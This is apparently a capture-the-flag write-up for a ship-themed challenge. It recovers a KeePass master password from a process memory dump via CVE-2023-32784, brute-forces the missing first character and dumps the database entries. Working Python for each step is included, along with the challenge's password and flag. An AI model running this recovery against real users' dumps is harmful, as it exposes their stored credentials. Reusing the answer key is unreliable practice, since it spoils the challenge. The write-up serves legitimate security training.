#### Challenge:

Ahoy, officer,

our captain has had too much naval espresso and is temporary unfit for duty. The chief officer is in command now, but he does not know the captain's passwords for key ship systems.  Good news is that the captain uses password manager and ship chief engineer was able to acquire captain's computer memory crash dump. Your task is to acquire password for signalization system. 

May you have fair winds and following seas!

Download the <a href="https://owncloud.cesnet.cz/index.php/s/LhKWx4kA8xWQq25/download" target="_blank">database and memory dump</a>.\
(MD5 checksum: `7c6246d6e21bd0dbda95a1317e4ae2c9`)

---

#### Solution:

The archive contains two files: a KeePass database `captain.kdbx` and a process memory
`crashdump.dmp`. I need the master password to open the database &mdash; and I can recover it
straight from the dump.

- inspecting the files shows a **KDBX 3.1** database (KeePass 2.x) and an **ELF core dump**
  of the KeePass process (the dump mentions `C:\Users\vs\Desktop\keepass\KeePass.exe`, a
  KeePass 2.x binary):
    ```bash
    $ od -A x -t x1z -v captain.kdbx | head -1
    000000 03 d9 a2 9a 67 fb 4b b5 01 00 03 00 ...   # KDBX magic, file version 3.1

    $ file crashdump.dmp
    crashdump.dmp: ELF 64-bit LSB core file, x86-64, version 1 (SYSV)
    $ strings crashdump.dmp | grep -i keepass.exe | head -1
    "C:\Users\vs\Desktop\keepass\KeePass.exe"
    ```

- KeePass 2.x &lt; 2.54 is vulnerable to **[CVE-2023-32784](https://nvd.nist.gov/vuln/detail/CVE-2023-32784)**:
  as the master password is typed into the `SecureTextBoxEx` field, a leftover managed string
  is created in memory for every keystroke &mdash; `●c`, `●●h`, `●●●a`, &hellip; (the mask
  character is `●`, `U+25CF`). Scanning the dump for those patterns recovers the whole master
  password **except the first character**. The public PoC is
  [keepass-dump-masterkey](https://github.com/vdohney/keepass-password-dumper); the same logic
  in a few lines of Python:
    ```python
    import re
    data = open("crashdump.dmp", "rb").read()
    mask = "\u25cf".encode("utf-16-le")                       # ● as UTF-16LE
    found = {}
    for m in re.finditer(b"(?:" + re.escape(mask) + b")+", data):
        n = (m.end() - m.start()) // 2                        # number of mask chars
        ch = data[m.end():m.end() + 2].decode("utf-16-le", "ignore")
        if ch and ch != "\u25cf" and 32 <= ord(ch) < 127:
            found.setdefault(n, {}).setdefault(ch, 0)
            found[n][ch] += 1
    for n in sorted(found):                                   # top candidates per position
        print(n, sorted(found[n].items(), key=lambda x: -x[1])[:4])
    ```
    reading the candidates, positions `2..22` each have a single char with a steady count (`5`
    here) &mdash; `ssword4mypreciousship`. Position `1` is noisier: its top hit `('W', 62)` is a
    string artifact, while the real character is the one matching the steady signal, `('a', 5)`.
    So positions `1..22` give `assword4mypreciousship`. Position `0` is never recoverable by this
    technique, so I brute-force just the first character against the database
    (`p` &rarr; `password4mypreciousship`):
    ```python
    import string
    from pykeepass import PyKeePass
    from pykeepass.exceptions import CredentialsError
    for c in string.printable:
        try:
            PyKeePass("captain.kdbx", password=c + "assword4mypreciousship")
            print("master password:", c + "assword4mypreciousship"); break
        except CredentialsError:
            pass
    ```

- finally I open the database with the recovered master password and read the captain's entries
  &mdash; the **Main Flag System** entry holds the flag:
    ```bash
    pip install pykeepass
    python3 -c '
    from pykeepass import PyKeePass
    kp = PyKeePass("captain.kdbx", password="password4mypreciousship")
    for e in kp.entries:
        print(f"[{e.group.name}] {e.title}: {e.password}")
    '
    # ...
    # [Inernal ship systems] Main Flag System: FLAG{....-....-....-....}
    ```

---

<details><summary>FLAG:</summary>

```
FLAG{pyeB-941A-bhGx-g3RI}
```

</details>
<br/>
